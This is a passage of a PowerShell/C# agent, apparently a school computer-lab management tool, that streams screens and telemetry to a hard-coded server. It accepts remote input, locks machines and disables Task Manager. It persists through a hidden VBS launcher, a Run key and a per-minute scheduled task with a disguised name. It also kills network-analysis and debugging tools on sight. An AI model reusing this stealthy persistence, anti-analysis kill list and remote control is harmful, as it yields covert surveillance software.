            MSLLHOOKSTRUCT mStruct = (MSLLHOOKSTRUCT)Marshal.PtrToStructure(lParam, typeof(MSLLHOOKSTRUCT));
            bool isInjected = (mStruct.flags & 0x01) != 0;
            if (!isInjected && BlockMouse) {
                return (IntPtr)1;
            }
        }
        return CallNextHookEx(_mouseHookID, nCode, wParam, lParam);
    }
}

public static class WinGuardNative {
    public static bool BlockInput(bool fBlockIt) {
        return WinGuardSecurity.BlockInput(fBlockIt);
    }
    public static bool SetForegroundWindow(IntPtr hWnd) {
        return WinGuardSecurity.SetForegroundWindow(hWnd);
    }
}
"@
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
if (-not ([System.Management.Automation.PSTypeName]'WinGuardSecurity').Type) {
    Add-Type -ReferencedAssemblies System.Drawing -TypeDefinition $csharpCode -Language CSharp
}
[WinGuardSecurity]::EnableTls()

$VPS_WS_LIST = @(
    "wss://103-149-172-179.sslip.io/ws/agent",
    "ws://103.149.172.179:4000/ws/agent"
)
$VPS_HTTP = "https://103-149-172-179.sslip.io"
$SECRET = "schoolguard-xubuntu-secret-2026"
$INSTALL_DIR = Join-Path $env:LOCALAPPDATA "SchoolGuard"

function Get-LocalIp {
    try {
        $ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notmatch "Loopback" -and $_.IPAddress -notlike "169.*" } | Select-Object -First 1).IPAddress
        if ($ip) { return $ip }
    } catch {}
    try {
        $ip2 = ([System.Net.Dns]::GetHostAddresses($env:COMPUTERNAME) | Where-Object { $_.AddressFamily -eq "InterNetwork" } | Select-Object -First 1).IPAddressToString
        if ($ip2) { return $ip2 }
    } catch {}
    return "127.0.0.1"
}

function Get-MacAddr {
    try {
        $mac = (Get-NetAdapter | Where-Object { $_.Status -eq "Up" } | Select-Object -First 1).MacAddress
        if ($mac) { return $mac.Replace("-", ":").ToLower() }
    } catch {}
    try {
        $wmiMac = (Get-CimInstance Win32_NetworkAdapterConfiguration | Where-Object { $_.IPEnabled -eq $true } | Select-Object -First 1).MACAddress
        if ($wmiMac) { return $wmiMac.ToLower() }
    } catch {}
    return "00:00:00:00:00:00"
}

function Get-MachineId {
    $hostClean = ($env:COMPUTERNAME.ToLower() -replace '[^a-z0-9_-]', '')
    if (-not $hostClean) { $hostClean = "winpc" }
    $macClean = ((Get-MacAddr) -replace '[^a-f0-9]', '')
    if ($macClean -and $macClean -ne "000000000000") {
        return "$hostClean-$macClean"
    }
    $ipClean = ((Get-LocalIp) -replace '[^0-9]', '-')
    return "$hostClean-$ipClean"
}

$MACHINE_ID = Get-MachineId
$HOSTNAME = $env:COMPUTERNAME
$DESKTOP_USER = $env:USERNAME
$SELF_SCRIPT_PATH = if ($Global:SG_SCRIPT_PATH) { $Global:SG_SCRIPT_PATH } else { $MyInvocation.MyCommand.Path }
$SELF_CODE = if ($SELF_SCRIPT_PATH -and (Test-Path $SELF_SCRIPT_PATH)) { [System.IO.File]::ReadAllText($SELF_SCRIPT_PATH) } else { "" }
$CONFIG_FILE = Join-Path $INSTALL_DIR "config.json"

function Load-BlockedAppsConfig {
    try {
        if (Test-Path $CONFIG_FILE) {
            $rawCfg = [System.IO.File]::ReadAllText($CONFIG_FILE, [System.Text.Encoding]::UTF8)
            $cfgObj = ConvertFrom-Json $rawCfg
            if ($cfgObj -and $null -ne $cfgObj.blocked_apps) {
                return @($cfgObj.blocked_apps)
            }
        }
    } catch {}
    return @()
}

function Save-BlockedAppsConfig($apps) {
    try {
        if (-not (Test-Path $INSTALL_DIR)) {
            New-Item -ItemType Directory -Path $INSTALL_DIR -Force | Out-Null
        }
        $jsonCfg = ConvertTo-Json @{ blocked_apps = @($apps) } -Compress
        [System.IO.File]::WriteAllText($CONFIG_FILE, $jsonCfg, [System.Text.Encoding]::UTF8)
    } catch {}
}

$Global:SharedState = [hashtable]::Synchronized(@{
    Mode          = "normal"
    MachineName   = $HOSTNAME
    LockMessage   = "Vui long trat tu va chu y theo doi huong dan cua Giao vien."
    LockInput     = $true
    LockKb        = $false
    LockMouse     = $false
    LiveFocus     = $false
    FrameBytes    = $null
    FrameTick     = 0
    VeyonStatus   = "disabled"
    VeyonRestarts = 0
    BlockedApps   = @(Load-BlockedAppsConfig)
    RunningApps   = @()
    ActiveWindow  = ""
})

# ============================================================================
# Fullscreen Lock & Broadcast UI Thread (STA Runspace)
# ============================================================================
$uiRunspace = [runspacefactory]::CreateRunspace()
$uiRunspace.ApartmentState = "STA"
$uiRunspace.ThreadOptions = "ReuseThread"
$uiRunspace.Open()
$uiRunspace.SessionStateProxy.SetVariable("SharedState", $Global:SharedState)

$uiPowershell = [powershell]::Create()
$uiPowershell.Runspace = $uiRunspace
[void]$uiPowershell.AddScript({
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing

    $form = New-Object System.Windows.Forms.Form
    $form.Text = "Windows Display Session Overlay"
    $form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::None
    $form.StartPosition = [System.Windows.Forms.FormStartPosition]::Manual
    $form.TopMost = $true
    $form.ShowInTaskbar = $false
    $form.BackColor = [System.Drawing.Color]::FromArgb(9, 11, 14)
    $form.KeyPreview = $true

    $vScreen = [System.Windows.Forms.SystemInformation]::VirtualScreen
    $pri = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $phys = [WinGuardSecurity]::GetPhysicalScreenSize($pri.Width, $pri.Height)
    $fullW = [Math]::Max($vScreen.Width, $phys[0])
    $fullH = [Math]::Max($vScreen.Height, $phys[1])
    $form.Bounds = New-Object System.Drawing.Rectangle($vScreen.Left, $vScreen.Top, $fullW, $fullH)

    $form.Add_FormClosing({
        param($s, $e)
        if ($SharedState.Mode -eq "lock" -or $SharedState.Mode -eq "broadcast") {
            $e.Cancel = $true
        }
    })
    $form.Add_KeyDown({
        param($s, $e)
        $e.Handled = $true
        $e.SuppressKeyPress = $true
    })

    $lockPanel = New-Object System.Windows.Forms.Panel
    $lockPanel.Dock = [System.Windows.Forms.DockStyle]::Fill
    $lockPanel.BackColor = [System.Drawing.Color]::FromArgb(9, 11, 14)

    $cardW = [Math]::Min(900, $phys[0] - 60)
    $cardH = 520
    $centerX = $pri.Left + [int](($phys[0] - $cardW) / 2) - $vScreen.Left
    $centerY = $pri.Top + [int](($phys[1] - $cardH) / 2) - $vScreen.Top

    $centerCard = New-Object System.Windows.Forms.Panel
    $centerCard.Size = New-Object System.Drawing.Size($cardW, $cardH)
    $centerCard.Location = New-Object System.Drawing.Point($centerX, $centerY)
    $centerCard.BackColor = [System.Drawing.Color]::FromArgb(9, 11, 14)
    $lockPanel.Controls.Add($centerCard)

    $lblClock = New-Object System.Windows.Forms.Label
    $lblClock.Text = "--:--:--"
    $lblClock.Font = New-Object System.Drawing.Font("Consolas", 38, [System.Drawing.FontStyle]::Bold)
    $lblClock.ForeColor = [System.Drawing.Color]::FromArgb(237, 237, 239)
    $lblClock.AutoSize = $false
    $lblClock.Width = $cardW
    $lblClock.Height = 56
    $lblClock.Left = 0
    $lblClock.Top = 10
    $lblClock.TextAlign = [System.Drawing.ContentAlignment]::MiddleCenter
    $centerCard.Controls.Add($lblClock)

    $lblDate = New-Object System.Windows.Forms.Label
    $lblDate.Text = "--/--/----"
    $lblDate.Font = New-Object System.Drawing.Font("Consolas", 11, [System.Drawing.FontStyle]::Regular)
    $lblDate.ForeColor = [System.Drawing.Color]::FromArgb(110, 119, 133)
    $lblDate.AutoSize = $false
    $lblDate.Width = $cardW
    $lblDate.Height = 24
    $lblDate.Left = 0
    $lblDate.Top = 68
    $lblDate.TextAlign = [System.Drawing.ContentAlignment]::MiddleCenter
    $centerCard.Controls.Add($lblDate)

    $lblBadge = New-Object System.Windows.Forms.Label
    $lblBadge.Text = "MAY HOC SINH - PHONG TIN HOC"
    $lblBadge.Font = New-Object System.Drawing.Font("Consolas", 11, [System.Drawing.FontStyle]::Bold)
    $lblBadge.BackColor = [System.Drawing.Color]::FromArgb(18, 21, 28)
    $lblBadge.ForeColor = [System.Drawing.Color]::FromArgb(155, 163, 176)
    $lblBadge.AutoSize = $false
    $lblBadge.Width = 420
    $lblBadge.Height = 34
    $lblBadge.Left = [int](($cardW - $lblBadge.Width) / 2)
    $lblBadge.Top = 106
    $lblBadge.TextAlign = [System.Drawing.ContentAlignment]::MiddleCenter
    $centerCard.Controls.Add($lblBadge)

    $lblTitle = New-Object System.Windows.Forms.Label
    $lblTitle.Text = "Man hinh dang tam khoa"
    $lblTitle.Font = New-Object System.Drawing.Font("Segoe UI", 22, [System.Drawing.FontStyle]::Bold)
    $lblTitle.ForeColor = [System.Drawing.Color]::FromArgb(237, 237, 239)
    $lblTitle.AutoSize = $false
    $lblTitle.Width = $cardW
    $lblTitle.Height = 48
    $lblTitle.Left = 0
    $lblTitle.Top = 152
    $lblTitle.TextAlign = [System.Drawing.ContentAlignment]::MiddleCenter
    $centerCard.Controls.Add($lblTitle)

    $msgCard = New-Object System.Windows.Forms.Panel
    $msgCard.Width = [Math]::Min(780, $cardW - 40)
    $msgCard.Height = 150
    $msgCard.Left = [int](($cardW - $msgCard.Width) / 2)
    $msgCard.Top = 216
    $msgCard.BackColor = [System.Drawing.Color]::FromArgb(17, 20, 27)

    $accentLine = New-Object System.Windows.Forms.Panel
    $accentLine.Dock = [System.Windows.Forms.DockStyle]::Left
    $accentLine.Width = 3
    $accentLine.BackColor = [System.Drawing.Color]::FromArgb(47, 111, 235)
    $msgCard.Controls.Add($accentLine)

    $lblMsgHead = New-Object System.Windows.Forms.Label
    $lblMsgHead.Text = "Thong bao tu giao vien"
    $lblMsgHead.Font = New-Object System.Drawing.Font("Segoe UI", 10, [System.Drawing.FontStyle]::Bold)
    $lblMsgHead.ForeColor = [System.Drawing.Color]::FromArgb(138, 145, 158)
    $lblMsgHead.AutoSize = $false
    $lblMsgHead.Width = $msgCard.Width - 40
    $lblMsgHead.Height = 24
    $lblMsgHead.Left = 24
    $lblMsgHead.Top = 16
    $lblMsgHead.TextAlign = [System.Drawing.ContentAlignment]::MiddleLeft
    $msgCard.Controls.Add($lblMsgHead)

    $lblMsg = New-Object System.Windows.Forms.Label
    $lblMsg.Text = $SharedState.LockMessage
    $lblMsg.Font = New-Object System.Drawing.Font("Segoe UI", 14, [System.Drawing.FontStyle]::Regular)
    $lblMsg.ForeColor = [System.Drawing.Color]::FromArgb(237, 237, 239)
    $lblMsg.AutoSize = $false
    $lblMsg.Width = $msgCard.Width - 48
    $lblMsg.Height = 90
    $lblMsg.Left = 24
    $lblMsg.Top = 46
    $lblMsg.TextAlign = [System.Drawing.ContentAlignment]::TopLeft
    $msgCard.Controls.Add($lblMsg)
    $centerCard.Controls.Add($msgCard)

    $lblFooter = New-Object System.Windows.Forms.Label
    $lblFooter.Text = "He thong Quan ly Phong may - Chuot va ban phim dang duoc quan ly boi Giao vien"
    $lblFooter.Font = New-Object System.Drawing.Font("Segoe UI", 10, [System.Drawing.FontStyle]::Regular)
    $lblFooter.BackColor = [System.Drawing.Color]::FromArgb(9, 11, 14)
    $lblFooter.ForeColor = [System.Drawing.Color]::FromArgb(86, 94, 107)
    $lblFooter.AutoSize = $false
    $lblFooter.Width = $cardW
    $lblFooter.Height = 32
    $lblFooter.Left = 0
    $lblFooter.Top = 390
    $lblFooter.TextAlign = [System.Drawing.ContentAlignment]::MiddleCenter
    $centerCard.Controls.Add($lblFooter)

    $picBox = New-Object System.Windows.Forms.PictureBox
    $picBox.Dock = [System.Windows.Forms.DockStyle]::Fill
    $picBox.BackColor = [System.Drawing.Color]::Black
    $picBox.SizeMode = [System.Windows.Forms.PictureBoxSizeMode]::Zoom
    $picBox.Visible = $false

    $form.Controls.Add($lockPanel)
    $form.Controls.Add($picBox)

    $lastTick = -1
    $isShowing = $false
    $topTick = 0

    $timer = New-Object System.Windows.Forms.Timer
    $timer.Interval = 40
    $timer.Add_Tick({
        $mode = $SharedState.Mode
        $effKb = ($mode -eq "lock") -or ($mode -eq "broadcast" -and $SharedState.LockInput) -or [bool]$SharedState.LockKb
        $effMouse = ($mode -eq "lock") -or ($mode -eq "broadcast" -and $SharedState.LockInput) -or [bool]$SharedState.LockMouse
        [WinGuardSecurity]::SyncInputHooks($effKb, $effMouse)

        if ($mode -eq "lock" -or $mode -eq "broadcast") {
            if (-not $isShowing) {
                $isShowing = $true
                $vs = [System.Windows.Forms.SystemInformation]::VirtualScreen
                $pr = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
                $ph = [WinGuardSecurity]::GetPhysicalScreenSize($pr.Width, $pr.Height)
                $fw = [Math]::Max($vs.Width, $ph[0])
                $fh = [Math]::Max($vs.Height, $ph[1])
                $form.Bounds = New-Object System.Drawing.Rectangle($vs.Left, $vs.Top, $fw, $fh)
                $form.TopMost = $true
                $form.Show()
                $form.Activate()
            } else {
                $topTick++
                if ($topTick -ge 25) {
                    $topTick = 0
                    $form.TopMost = $true
                }
            }

            if ($mode -eq "lock") {
                $picBox.Visible = $false
                $lockPanel.Visible = $true
                $lblBadge.Text = $SharedState.MachineName + " - PHONG TIN HOC"
                $lblMsg.Text = $SharedState.LockMessage
                $now = Get-Date
                $lblClock.Text = $now.ToString("HH:mm:ss")
                $lblDate.Text = $now.ToString("dd/MM/yyyy")
            } else {
                $lockPanel.Visible = $false
                $picBox.Visible = $true
                if ($SharedState.FrameTick -ne $lastTick -and $SharedState.FrameBytes) {
                    $lastTick = $SharedState.FrameTick
                    try {
                        $ms = New-Object System.IO.MemoryStream(,$SharedState.FrameBytes)
                        $newImg = [System.Drawing.Image]::FromStream($ms)
                        $oldImg = $picBox.Image
                        $picBox.Image = $newImg
                        if ($oldImg) { $oldImg.Dispose() }
                        $ms.Dispose()
                    } catch {}
                }
            }
        } else {
            if ($isShowing) {
                $isShowing = $false
                $form.TopMost = $false
                $form.Hide()
            }
        }
    })
    $timer.Start()
    [System.Windows.Forms.Application]::Run()
})
$uiAsync = $uiPowershell.BeginInvoke()

function Capture-ScreenBase64 {
    $bmp = $null
    $g = $null
    $resized = $null
    $rg = $null
    $ms = $null
    try {
        $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $phys = [WinGuardSecurity]::GetPhysicalScreenSize($bounds.Width, $bounds.Height)
        $capW = $phys[0]
        $capH = $phys[1]
        if ($capW -le 0 -or $capH -le 0) { return $null }

        $bmp = New-Object System.Drawing.Bitmap($capW, $capH)
        $g = [System.Drawing.Graphics]::FromImage($bmp)
        $g.CopyFromScreen($bounds.Left, $bounds.Top, 0, 0, (New-Object System.Drawing.Size($capW, $capH)))

        $tw = if ($Global:SharedState.LiveFocus) { 1280 } else { 640 }
        $th = if ($Global:SharedState.LiveFocus) { 720 } else { 360 }
        $resized = New-Object System.Drawing.Bitmap($tw, $th)
        $rg = [System.Drawing.Graphics]::FromImage($resized)
        $rg.InterpolationMode = [System.Drawing.Drawing2D.InterpolationMode]::Bilinear
        $rg.DrawImage($bmp, 0, 0, $tw, $th)

        $ms = New-Object System.IO.MemoryStream
        $resized.Save($ms, [System.Drawing.Imaging.ImageFormat]::Jpeg)
        return [Convert]::ToBase64String($ms.ToArray())
    } catch {
        return $null
    } finally {
        if ($null -ne $ms) { try { $ms.Dispose() } catch {} }
        if ($null -ne $rg) { try { $rg.Dispose() } catch {} }
        if ($null -ne $resized) { try { $resized.Dispose() } catch {} }
        if ($null -ne $g) { try { $g.Dispose() } catch {} }
        if ($null -ne $bmp) { try { $bmp.Dispose() } catch {} }
    }
}

function Invoke-SelfHeal {
    try {
        if (-not (Test-Path $INSTALL_DIR)) {
            New-Item -ItemType Directory -Path $INSTALL_DIR -Force | Out-Null
        }
        $targetAgent = Join-Path $INSTALL_DIR "agent_win.ps1"
        if ($SELF_CODE -and -not (Test-Path $targetAgent)) {
            [System.IO.File]::WriteAllText($targetAgent, $SELF_CODE, [System.Text.Encoding]::ASCII)
        }
        $vbsPath = Join-Path $INSTALL_DIR "run_hidden.vbs"
        if (-not (Test-Path $vbsPath)) {
            $vbsContent = "Set ws = CreateObject(""Wscript.Shell"")`r`nws.Run ""powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File """"$targetAgent"""""", 0, False"
            [System.IO.File]::WriteAllText($vbsPath, $vbsContent, [System.Text.Encoding]::ASCII)
        }
        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        Set-ItemProperty -Path $regPath -Name "SchoolGuardAgent" -Value "wscript.exe `"$vbsPath`"" -Force
        & schtasks.exe /Create /F /SC MINUTE /MO 1 /TN "WinDisplaySession" /TR "wscript.exe `"$vbsPath`"" 2>$null | Out-Null

        if ($Global:SharedState.VeyonStatus -eq "disabled") {
            $rogue = Get-Process -Name "*veyon*" -ErrorAction SilentlyContinue
            if ($rogue) {
                Stop-Process -Name "*veyon*" -Force -ErrorAction SilentlyContinue
            }
        } else {
            $vSvc = Get-Service -Name "VeyonService" -ErrorAction SilentlyContinue
            if ($null -eq $vSvc) {
                $Global:SharedState.VeyonStatus = "not_installed"
            } elseif ($vSvc.Status -eq "Running") {
                $Global:SharedState.VeyonStatus = "running"
            } else {
                $Global:SharedState.VeyonStatus = "stopped"
            }
        }
    } catch {}
}

function Get-DiskMetrics {
    try {
        $d = [System.IO.DriveInfo]::new("C")
        if ($d.IsReady -and $d.TotalSize -gt 0) {
            $usedPct = [int][Math]::Round((($d.TotalSize - $d.AvailableFreeSpace) * 100.0) / $d.TotalSize)
            $freeGb = [Math]::Round($d.AvailableFreeSpace / 1073741824.0, 1)
            $totalGb = [Math]::Round($d.TotalSize / 1073741824.0, 1)
            return @($usedPct, $freeGb, $totalGb)
        }
    } catch {}
    return @(0, 0, 0)
}

function Update-RunningAppsAndEnforceBlock {
    $protected = @("explorer", "powershell", "pwsh", "cmd", "conhost", "svchost", "csrss", "wininit", "winlogon", "lsass", "services", "smss", "dwm", "sihost", "taskhostw", "ctfmon", "fontdrvhost", "runtimebroker", "searchhost", "startmenuexperiencehost", "shellexperiencehost", "textinputhost", "wscript", "cscript", "idle", "system")
    $alwaysBlocked = @("wireshark", "tshark", "fiddler", "httpdebugger", "charles", "nmap", "zenmap", "veyon-master", "veyon-configurator", "processhacker", "x64dbg", "x32dbg", "cheatengine")
    $running = New-Object System.Collections.Generic.HashSet[string]
    $topList = New-Object System.Collections.Generic.List[object]
    $activeWin = ""
    $totalProcCount = 0
    $blocked = @($alwaysBlocked)
    if ($Global:SharedState.BlockedApps -and $Global:SharedState.BlockedApps.Count -gt 0) {
        $blocked += @($Global:SharedState.BlockedApps)
    }

    try {
        $procs = Get-Process -ErrorAction SilentlyContinue
        $totalProcCount = if ($procs) { $procs.Count } else { 0 }
        foreach ($p in $procs) {
            if ($p.Id -eq $PID) { continue }
            $pName = ($p.ProcessName + "").ToLower()
            if (-not $pName -or ($protected -contains $pName)) { continue }

            if ($blocked -and $blocked.Count -gt 0) {
                $shouldKill = $false
                foreach ($b in $blocked) {
                    $kw = ($b + "").Trim().ToLower()
                    if ($kw -and ($pName -like "*$kw*")) {
                        $shouldKill = $true
                        break
                    }
                }
                if ($shouldKill) {
                    Stop-Process -Id $p.Id -Force -ErrorAction SilentlyContinue
                    continue
                }
            }

            if ($p.MainWindowHandle -ne 0 -and $p.MainWindowTitle) {
                [void]$running.Add($p.ProcessName)
                if (-not $activeWin) {
                    $activeWin = $p.MainWindowTitle
                }
                $memMb = [int][Math]::Round($p.WorkingSet64 / 1048576.0)
                $topList.Add(@{
                    name   = $p.ProcessName
                    pid    = $p.Id
                    mem_mb = $memMb
                    title  = $p.MainWindowTitle
                })
            }
        }
    } catch {}

    $Global:SharedState.RunningApps = @($running)
    $Global:SharedState.ActiveWindow = $activeWin
    $Global:SharedState.ProcessCount = $totalProcCount
    $Global:SharedState.TopProcesses = @($topList | Sort-Object { $_.mem_mb } -Descending | Select-Object -First 12)
}

function Stop-StudentApps($appTargets) {
    $protected = @("explorer", "powershell", "pwsh", "svchost", "csrss", "wininit", "winlogon", "lsass", "services", "smss", "dwm", "sihost", "taskhostw", "ctfmon", "wscript", "cscript", "idle", "system")
    $keywords = @()
    if ($appTargets -is [Array]) {
        $keywords = $appTargets
    } elseif ($appTargets) {
        $keywords = ($appTargets.ToString() -split ",")
    }
    foreach ($kwRaw in $keywords) {
        $kw = ($kwRaw + "").Trim().ToLower()
        if (-not $kw -or ($protected -contains $kw)) { continue }
        try {
            Get-Process -ErrorAction SilentlyContinue | Where-Object {
                $_.Id -ne $PID -and ($protected -notcontains $_.ProcessName.ToLower()) -and ($_.ProcessName.ToLower() -like "*$kw*")
            } | Stop-Process -Force -ErrorAction SilentlyContinue
        } catch {}
    }
}

function Close-AllStudentApps {
    $protected = @("explorer", "powershell", "pwsh", "cmd", "conhost", "svchost", "csrss", "wininit", "winlogon", "lsass", "services", "smss", "dwm", "sihost", "taskhostw", "ctfmon", "fontdrvhost", "runtimebroker", "searchhost", "startmenuexperiencehost", "shellexperiencehost", "textinputhost", "wscript", "cscript", "idle", "system")
    try {
        Get-Process -ErrorAction SilentlyContinue | Where-Object {
            $_.Id -ne $PID -and $_.MainWindowHandle -ne 0 -and ($protected -notcontains $_.ProcessName.ToLower())
        } | ForEach-Object {
            Stop-Process -Id $_.Id -Force -ErrorAction SilentlyContinue
        }
    } catch {}
}

function Send-WsJson($ws, $obj) {
    try {
        if ($ws.State -eq [System.Net.WebSockets.WebSocketState]::Open) {
            $json = ConvertTo-Json $obj -Depth 5 -Compress
            $bytes = [System.Text.Encoding]::UTF8.GetBytes($json)
            $seg = New-Object System.ArraySegment[byte](,$bytes)
            $ws.SendAsync($seg, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, [System.Threading.CancellationToken]::None).GetAwaiter().GetResult()
        }
    } catch {}
}

function Build-TelemetryPayload($msgType) {
    $mem = [WinGuardSecurity]::GetMemoryMetrics()
    $dsk = Get-DiskMetrics
    $aud = [WinGuardSecurity]::GetAudioStatus()
    $cam = [WinGuardSecurity]::GetWebcamStatus()
    return @{
        type           = $msgType
        agent_version  = "3.7"
        machine_id     = $MACHINE_ID
        hostname       = $HOSTNAME
        ip             = (Get-LocalIp)
        mac            = (Get-MacAddr)
        os             = "Windows (" + [Environment]::OSVersion.Version.ToString() + ")"
        desktop_user   = $DESKTOP_USER
        mode           = $Global:SharedState.Mode
        input_locked   = ([bool]$Global:SharedState.LockKb -or [bool]$Global:SharedState.LockMouse)
        lock_kb        = [bool]$Global:SharedState.LockKb
        lock_mouse     = [bool]$Global:SharedState.LockMouse
        veyon_status   = $Global:SharedState.VeyonStatus
        veyon_restarts = $Global:SharedState.VeyonRestarts
        blocked_apps   = @($Global:SharedState.BlockedApps)
        running_apps   = @($Global:SharedState.RunningApps)
        active_window  = $Global:SharedState.ActiveWindow
        cpu_usage      = [WinGuardSecurity]::GetCpuPercent()
        ram_usage      = [int]$mem[0]
        ram_used_gb    = $mem[1]
        ram_total_gb   = $mem[2]
        disk_usage     = [int]$dsk[0]
        disk_free_gb   = $dsk[1]
        disk_total_gb  = $dsk[2]
        uptime_sec     = [WinGuardSecurity]::GetUptimeSeconds()
        process_count  = [int]$Global:SharedState.ProcessCount
        top_processes  = @($Global:SharedState.TopProcesses)
        audio_info     = @{
            has_mic       = [bool]$aud[0]
            mic_name      = [string]$aud[1]
            has_speaker   = [bool]$aud[2]
            speaker_name  = [string]$aud[3]
            volume        = [int]$aud[4]
            muted         = [bool]$aud[5]
            mic_listening = [bool]$aud[6]
            mic_level     = [int]$aud[7]
            listen_mode   = [string]$aud[8]
        }
        webcam_info    = @{
            has_webcam       = [bool]$cam[0]
            webcam_name      = [string]$cam[1]
            webcam_streaming = [bool]$cam[2]
        }
    }
}

function Send-WsStatus($ws) {
    Send-WsJson $ws (Build-TelemetryPayload "STATUS")
}

# ============================================================================
# Real-time WebSocket Loop (Supports TLS 1.2 + Fallback WS :4000)
# ============================================================================
[WinGuardSecurity]::EnableTls()

$wsIndex = 0
while ($true) {
    $currentWsUrl = $VPS_WS_LIST[$wsIndex % $VPS_WS_LIST.Count]
    $wsIndex++

    $ws = New-Object System.Net.WebSockets.ClientWebSocket
    $ws.Options.SetRequestHeader("X-SchoolGuard-Secret", $SECRET)
    $ws.Options.SetRequestHeader("X-Machine-Id", $MACHINE_ID)

    try {
        $uri = [Uri]$currentWsUrl
        $ws.ConnectAsync($uri, [System.Threading.CancellationToken]::None).GetAwaiter().GetResult()

        Update-RunningAppsAndEnforceBlock
        Send-WsJson $ws (Build-TelemetryPayload "REGISTER")

        $recvBuf = New-Object byte[] 65536
        $recvSeg = New-Object System.ArraySegment[byte](,$recvBuf)
        $msMsg = New-Object System.IO.MemoryStream
        $recvTask = $ws.ReceiveAsync($recvSeg, [System.Threading.CancellationToken]::None)

        $lastScreenTime = [DateTime]::MinValue
        $lastHealTime = [DateTime]::MinValue
        $lastAppCheckTime = [DateTime]::MinValue

        while ($ws.State -eq [System.Net.WebSockets.WebSocketState]::Open) {
            if ($recvTask.Wait(25)) {
                $res = $recvTask.GetAwaiter().GetResult()
                if ($res.MessageType -eq [System.Net.WebSockets.WebSocketMessageType]::Close) {
                    break
                }
                if ($res.Count -gt 0) {
                    $msMsg.Write($recvBuf, 0, $res.Count)
                }
                if ($res.EndOfMessage) {
                    $rawStr = [System.Text.Encoding]::UTF8.GetString($msMsg.ToArray())
                    $msMsg.SetLength(0)

                    try {
                        $msg = ConvertFrom-Json $rawStr
                        $cmd = $msg.command
                        $payload = $msg.payload

                        switch ($cmd) {
                            "SYNC_CONFIG" {
                                if ($payload.machine_name) { $Global:SharedState.MachineName = $payload.machine_name }
                                if ($null -ne $payload.live_focus) { $Global:SharedState.LiveFocus = [bool]$payload.live_focus }
                                if ($payload.veyon_disabled) { $Global:SharedState.VeyonStatus = "disabled" }
                                if ($null -ne $payload.blocked_apps) {
                                    $Global:SharedState.BlockedApps = @($payload.blocked_apps)
                                    Save-BlockedAppsConfig $Global:SharedState.BlockedApps
                                    Update-RunningAppsAndEnforceBlock
                                    Send-WsStatus $ws
                                }
                            }
                            "LOCK" {
                                if ($payload.message) { $Global:SharedState.LockMessage = $payload.message }
                                $Global:SharedState.LockInput = $true
                                $Global:SharedState.Mode = "lock"
                                Send-WsStatus $ws
                                [WinGuardSecurity]::BlockInput($true) | Out-Null
                                [WinGuardSecurity]::InstallHook() | Out-Null
                                [WinGuardSecurity]::SetTaskMgrDisabled($true) | Out-Null
                                $lastScreenTime = [DateTime]::UtcNow.AddSeconds(-1.85)
                            }
                            "UNLOCK" {
                                $Global:SharedState.Mode = "normal"
                                $Global:SharedState.LockInput = $false
                                $Global:SharedState.LockKb = $false
                                $Global:SharedState.LockMouse = $false
                                [WinGuardSecurity]::BlockInput($false) | Out-Null
                                [WinGuardSecurity]::UninstallHook() | Out-Null
                                [WinGuardSecurity]::SetTaskMgrDisabled($false) | Out-Null
                                Send-WsStatus $ws
                                Stop-Process -Name "VeyonWorker", "VeyonMaster", "*veyon*" -Force -ErrorAction SilentlyContinue
                                $lastScreenTime = [DateTime]::UtcNow.AddSeconds(-1.85)
                            }
                            "SET_INPUT_LOCK" {
                                $lkb = if ($null -ne $payload.lock_kb) { [bool]$payload.lock_kb } elseif ($null -ne $payload.locked) { [bool]$payload.locked } else { $false }
                                $lms = if ($null -ne $payload.lock_mouse) { [bool]$payload.lock_mouse } elseif ($null -ne $payload.locked) { [bool]$payload.locked } else { $false }
                                $Global:SharedState.LockKb = $lkb
                                $Global:SharedState.LockMouse = $lms
                                [WinGuardSecurity]::SetTaskMgrDisabled(($lkb -or $lms)) | Out-Null
                                if (-not $lkb -and -not $lms) {
                                    [WinGuardSecurity]::BlockInput($false) | Out-Null
                                }
                                Send-WsStatus $ws
                            }
                            "REMOTE_INPUT" {
                                $kind = $payload.kind
                                if ($kind -eq "mouse") {
                                    $b = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
                                    $phys = [WinGuardSecurity]::GetPhysicalScreenSize($b.Width, $b.Height)
                                    $act = [string]$payload.action
                                    $xr = [double]$payload.x
                                    $yr = [double]$payload.y
                                    $btn = [string]$payload.button
                                    $wd = if ($null -ne $payload.deltaY) { -1 * [int]$payload.deltaY } else { 0 }
                                    [WinGuardSecurity]::RemoteMouse($act, $xr, $yr, $btn, $wd, $phys[0], $phys[1], $b.Left, $b.Top)
                                    if ($act -ne "move") {
                                        $lastScreenTime = [DateTime]::UtcNow.AddSeconds(-1.35)
                                    }
                                } elseif ($kind -eq "key") {
                                    $vk = if ($null -ne $payload.keyCode) { [byte]([int]$payload.keyCode -band 0xFF) } else { [byte]0 }
                                    $ctrl = [bool]$payload.ctrl
                                    $alt = [bool]$payload.alt
                                    $shift = [bool]$payload.shift
                                    $win = [bool]$payload.win
                                    if ($vk -gt 0) {
                                        [WinGuardSecurity]::RemoteKeyVk($vk, $ctrl, $alt, $shift, $win)
                                    }
                                    $lastScreenTime = [DateTime]::UtcNow.AddSeconds(-1.35)
                                } elseif ($kind -eq "text") {
                                    $txt = [string]$payload.text
                                    if ($txt) {
                                        try {
                                            Set-Clipboard -Value $txt -ErrorAction Stop
                                            [WinGuardSecurity]::RemoteKeyVk(0x56, $true, $false, $false, $false)
                                        } catch {
                                            $escaped = $txt -replace '([+\^%~(){}\[\]])', '{$1}'
                                            try { [System.Windows.Forms.SendKeys]::SendWait($escaped) } catch {}
                                        }
                                        $lastScreenTime = [DateTime]::UtcNow.AddSeconds(-1.35)
                                    }
                                } elseif ($kind -eq "clipboard") {
                                    $txt = [string]$payload.text
                                    if ($txt) {
                                        try { Set-Clipboard -Value $txt } catch {}
                                    }
                                }
                            }
                            "SET_BLOCKED_APPS" {
                                if ($null -ne $payload.apps) {
